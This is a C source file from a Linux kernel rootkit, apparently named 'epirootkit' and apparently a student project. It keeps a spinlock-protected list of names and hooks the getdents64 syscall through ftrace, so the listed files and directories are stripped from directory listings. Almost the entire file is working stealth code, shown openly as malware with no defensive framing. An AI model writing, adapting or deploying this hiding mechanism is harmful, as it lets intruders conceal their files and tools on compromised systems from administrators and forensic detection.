#include <linux/fs.h>
#include <linux/list.h>
#include <linux/spinlock.h>

#include "epirootkit.h"

// Directory entry structure as 'returned' (by pointer) by getdents64 syscall
// Used to read a directory content
// If I do not define it here, I have a compilation error... does not seem to be included in linux headers
// (tried dirent.h, with no success)
// (at least not in the ones I have on my system LOL)
struct linux_dirent64 {
    u64 d_ino;
    s64 d_off;
    unsigned short d_reclen;
    unsigned char d_type;
    char d_name[];
};

// Structure to hold hidden directory names
// Linux linked List implementation
struct hidden_dir_entry {
    char *dirname;
    struct list_head list;
};

static LIST_HEAD(hidden_dirs_list);
static DEFINE_SPINLOCK(hidden_dirs_lock);

// Function prototypes
int add_hidden_dir(const char *dirname);
int remove_hidden_dir(const char *dirname);
int is_hidden(const char *name);
asmlinkage int getdents64_hook(const struct pt_regs *regs);

/**
 * @brief Adds a directory name to the dynamic hidden directories list.
 *
 * @dirname: The directory name to remove.
 * @return 0 on success or a negative error code on failure.
 */
int add_hidden_dir(const char *dirname) {
    struct hidden_dir_entry *entry;

    // Allocate memory for the new hidden directory entry.
    entry = kmalloc(sizeof(*entry), GFP_KERNEL);
    if (!entry)
        return -ENOMEM;

    // Duplicate the directory name to store it safely.
    entry->dirname = kstrdup(dirname, GFP_KERNEL);
    if (!entry->dirname) {
        kfree(entry);
        return -ENOMEM;
    }

    // Acquire the spinlock to modify the list.
    spin_lock(&hidden_dirs_lock);
    list_add_tail(&entry->list, &hidden_dirs_list);
    spin_unlock(&hidden_dirs_lock);

    return 0;
}

/**
 * @brief Removes a directory name from the dynamic hidden directories list.
 *
 * @dirname: The directory name to remove.
 * @return 0 on success or -ENOENT if the directory name is not found.
 */
int remove_hidden_dir(const char *dirname) {
    struct hidden_dir_entry *entry, *tmp;
    int found = 0;

    // Acquire the spinlock for safe list traversal and modification.
    spin_lock(&hidden_dirs_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_dirs_list, list) {
        if (strcmp(entry->dirname, dirname) == 0) {
            list_del(&entry->list);
            kfree(entry->dirname);
            kfree(entry);
            found = 1;
            break;
        }
    }
    spin_unlock(&hidden_dirs_lock);

    return found ? 0 : -ENOENT;
}

/**
 * @brief Checks if a given directory name is in the hidden list.
 *
 * @name: The directory name to check.
 * @return 1 if the directory is to be hidden, 0 otherwise.
 */
int is_hidden(const char *name) {
    struct hidden_dir_entry *entry;
    int hidden = 0;

    spin_lock(&hidden_dirs_lock);
    list_for_each_entry(entry, &hidden_dirs_list, list) {
        if (strcmp(entry->dirname, name) == 0) {
            hidden = 1;
            break;
        }
    }
    spin_unlock(&hidden_dirs_lock);
    return hidden;
}

// Original syscall pointer
asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs);

// Function to hook the getdents64 syscall
asmlinkage int getdents64_hook(const struct pt_regs *regs) {
    // Store the result (number of bytes read) by the original syscall
    int ret;

    // Get the pointer to the directory entrues buffer (allocated before by the
    // kernel) (if I understood well..)
    struct linux_dirent64 __user *user_dir =
        (struct linux_dirent64 __user *)regs->si;

    // Get the size of the buffer
    // unsigned int count = (unsigned int)regs->dx;

    // Call the original getdents64 syscall, to have the buffer updated
    // Next, we just need to check directories in the buffer,
    // remove the ones we don't want, and copy the buffer to user space
    ret = __orig_getdents64(regs);
    if (ret < 0)
        return ret;

    // Allocate a temporary buffer in kernel space for copying and processing
    // the entries. Next copy the buffer from user space to kernel space.
    char *kbuf = kmalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, user_dir, ret)) {
        kfree(kbuf);
        return ret;
    }

    // Current position in the kbuf buffer for processing entries
    unsigned int offset = 0;

    // Allocate a second temporary buffer to store the non-hidden directory
    // entries
    char *newbuf = kmalloc(ret, GFP_KERNEL);
    if (!newbuf) {
        kfree(kbuf);
        return ret;
    }

    unsigned int new_size = ret;
    unsigned int new_off = 0;

    while (offset < ret) {
        // For each entry, get the pointer to its linux_dirent64 structure
        struct linux_dirent64 *d = (struct linux_dirent64 *)(kbuf + offset);

        // Length of the current directory entry
        int reclen = d->d_reclen;

        // Check if the entry name matches a directory that should be hidden
        if (is_hidden(d->d_name)) {
            new_size -= reclen;
        }
        else {
            memcpy(newbuf + new_off, d, reclen);
            new_off += reclen;
        }

        offset += reclen;
    }

    // Copy the modified new buffer back to the user-space buffer to replace the original buf
    if (copy_to_user(user_dir, newbuf, new_size)) {
        kfree(kbuf);
        kfree(newbuf);
        return ret;
    }

    kfree(kbuf);
    kfree(newbuf);

    // New size without directories we do not want...
    return new_size;
}

// Array of hooks to install.
size_t hook_array_size = 1;
struct ftrace_hook hooks[] = {
    HOOK("sys_getdents64", getdents64_hook, &__orig_getdents64)
};